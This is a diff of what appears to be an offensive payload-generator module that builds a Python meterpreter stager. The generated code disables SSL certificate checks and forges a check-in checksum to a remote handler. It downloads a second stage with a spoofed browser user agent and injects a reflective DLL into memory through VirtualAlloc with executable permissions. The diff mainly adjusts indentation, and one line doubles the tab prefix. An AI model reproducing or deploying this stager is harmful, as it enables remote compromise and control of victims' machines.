@@ -82,34 +82,35 @@ class PayloadModule:
         payload_code = payload_code + payload_code2
 
         # helper method that returns the sum of all ord values in a string % 0x100
-        payload_code += "ssl._create_default_https_context = ssl._create_unverified_context\n"
-        payload_code += "def %s(s): return sum([ord(ch) for ch in s]) %% 0x100\n" %(sumMethodName)
+        payload_code +=  '\t' * num_tabs_required + "ssl._create_default_https_context = ssl._create_unverified_context\n"
+        payload_code +=  '\t' * num_tabs_required + "def %s(s): return sum([ord(ch) for ch in s]) %% 0x100\n" %(sumMethodName)
 
         # method that generates a new checksum value for checkin to the meterpreter handler
-        payload_code += "def %s():\n\tfor x in range(64):\n" %(checkinMethodName)
-        payload_code += "\t\t%s = ''.join(random.sample(string.ascii_letters + string.digits,3))\n" %(randBaseName)
-        payload_code += "\t\t%s = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))\n" %(randLettersName)
-        payload_code += "\t\tfor %s in %s:\n" %(randLetterSubName, randLettersName)
-        payload_code += "\t\t\tif %s(%s + %s) == 92: return %s + %s\n" %(sumMethodName, randBaseName, randLetterSubName, randBaseName, randLetterSubName)
+        payload_code +=  '\t' * num_tabs_required + "def %s():\n" %(checkinMethodName)
+        payload_code +=  '\t' * num_tabs_required + "\tfor x in range(64):\n"
+        payload_code +=  '\t' * num_tabs_required + "\t\t%s = ''.join(random.sample(string.ascii_letters + string.digits,3))\n" %(randBaseName)
+        payload_code +=  '\t' * num_tabs_required + "\t\t%s = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))\n" %(randLettersName)
+        payload_code +=  '\t' * num_tabs_required + "\t\tfor %s in %s:\n" %(randLetterSubName, randLettersName)
+        payload_code +=  '\t' * num_tabs_required + "\t\t\tif %s(%s + %s) == 92: return %s + %s\n" %(sumMethodName, randBaseName, randLetterSubName, randBaseName, randLetterSubName)
 
         # method that connects to a host/port over https and downloads the hosted data
-        payload_code += "def %s(%s,%s):\n" %(downloadMethodName, hostName, portName)
-        payload_code += "\t" + proxy_var + " = urllib.request.ProxyHandler({})\n"
-        payload_code += "\t" + opener_var + " = urllib.request.build_opener(" + proxy_var + ")\n"
-        payload_code += "\turllib.request.install_opener(" + opener_var + ")\n"
-        payload_code += '\t' * num_tabs_required + "\t" + requestName + " = urllib.request.Request(\"https://\" + " + hostName + " + \":\" + str(" + portName + ") + \"/\" + " + checkinMethodName + "(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n"
-        payload_code += "\ttry:\n"
-        payload_code += "\t\t%s = urllib.request.urlopen(%s)\n" %(tName, requestName)
-        payload_code += "\t\ttry:\n"
-        payload_code += "\t\t\tif int(%s.info()[\"Content-Length\"]) > 100000: return %s.read()\n" %(tName, tName)
-        payload_code += "\t\t\telse: return ''\n"
-        payload_code += "\t\texcept: return %s.read()\n" % (tName)
-        payload_code += "\texcept urllib.request.URLError: return ''\n"
+        payload_code +=  '\t' * num_tabs_required + "def %s(%s,%s):\n" %(downloadMethodName, hostName, portName)
+        payload_code +=  '\t' * num_tabs_required + "\t" + proxy_var + " = urllib.request.ProxyHandler({})\n"
+        payload_code +=  '\t' * num_tabs_required + "\t" + opener_var + " = urllib.request.build_opener(" + proxy_var + ")\n"
+        payload_code +=  '\t' * num_tabs_required + "\turllib.request.install_opener(" + opener_var + ")\n"
+        payload_code +=  '\t' * num_tabs_required + '\t' * num_tabs_required + requestName + " = urllib.request.Request(\"https://\" + " + hostName + " + \":\" + str(" + portName + ") + \"/\" + " + checkinMethodName + "(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n"
+        payload_code +=  '\t' * num_tabs_required + "\ttry:\n"
+        payload_code +=  '\t' * num_tabs_required + "\t\t%s = urllib.request.urlopen(%s)\n" %(tName, requestName)
+        payload_code +=  '\t' * num_tabs_required + "\t\ttry:\n"
+        payload_code +=  '\t' * num_tabs_required + "\t\t\tif int(%s.info()[\"Content-Length\"]) > 100000: return %s.read()\n" %(tName, tName)
+        payload_code +=  '\t' * num_tabs_required + "\t\t\telse: return ''\n"
+        payload_code +=  '\t' * num_tabs_required + "\t\texcept: return %s.read()\n" % (tName)
+        payload_code +=  '\t' * num_tabs_required + "\texcept urllib.request.URLError: return ''\n"
 
         # method to inject a reflective .dll into memory
-        payload_code += "def %s(%s):\n" %(injectMethodName, dataName)
-        payload_code += "\tif %s != \"\":\n" %(dataName)
-        payload_code += "\t\t%s = bytearray(%s)\n" %(byteArrayName, dataName)
+        payload_code +=  '\t' * num_tabs_required + "def %s(%s):\n" %(injectMethodName, dataName)
+        payload_code +=  '\t' * num_tabs_required + "\tif %s != \"\":\n" %(dataName)
+        payload_code +=  '\t' * num_tabs_required + "\t\t%s = bytearray(%s)\n" %(byteArrayName, dataName)
         
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
             payload_code += '\t' * num_tabs_required + "\t\t" + ptrName + " = " + randctypes + ".windll.kernel32.VirtualAlloc(" + randctypes + ".c_int(0)," + randctypes + ".c_int(len(" + byteArrayName + ")), " + randctypes + ".c_int(0x3000)," + randctypes + ".c_int(0x40))\n"
